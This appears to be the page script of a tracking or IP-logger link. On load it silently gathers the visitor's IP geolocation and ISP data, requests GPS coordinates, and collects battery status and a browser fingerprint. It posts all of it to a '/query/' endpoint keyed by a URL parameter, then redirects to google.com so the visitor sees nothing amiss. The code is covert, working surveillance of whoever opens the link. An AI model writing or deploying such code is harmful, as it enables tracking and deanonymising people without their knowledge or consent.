  const n = navigator;
  let info_dict = {};
  let url = `http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,reverse,mobile,proxy,hosting,query`;

  const load = () => {
    fetch(url)
      .then((res) => res.json())
      .then((res) => {
        navigator.geolocation.getCurrentPosition((res) => {
          info_dict.location = res.coords;
        });
        const nav_dict = {};
        navigator.getBattery().then((res) => {
          nav_dict.battery_charging = res.charging;
          nav_dict.battery_level = `${parseInt(res.level * 100)}%`;
        });
        const nav = () => {
          nav_dict.appName = n.appName;
          nav_dict.appCodeName = n.appCodeName;
          nav_dict.appVersion = n.appVersion;
          nav_dict.javascriptEnabled = n.javaEnabled().toString();
          nav_dict.language = n.language;
          nav_dict.userAgent = n.userAgent;
          nav_dict.deviceMemory = n.deviceMemory;
          nav_dict.hardwareConcurrency = n.hardwareConcurrency;
          nav_dict.platform = n.platform;
          nav_dict.pdfViewerEnabled = n.pdfViewerEnabled;
          nav_dict.windowInnerHeight = window.innerHeight;
          nav_dict.windowInnerWidth = window.innerWidth;
          return nav_dict;
        };

        info_dict.browser = nav();
        info_dict.isp = res;
      })
      .catch(() => {
        // load();
      })
      .finally(() => {
        const params = new URLSearchParams(window.location.search);
        $.ajax({
          url: '/query/'+params.get('query'),
          type: "post",
          data: { res: JSON.stringify(info_dict) },
          success: (res) => {
            console.log(res);
          },
          error: (error) => {
            console.log(error);
          },
        });
          location.href = "https://google.com";
      });
  };
  load();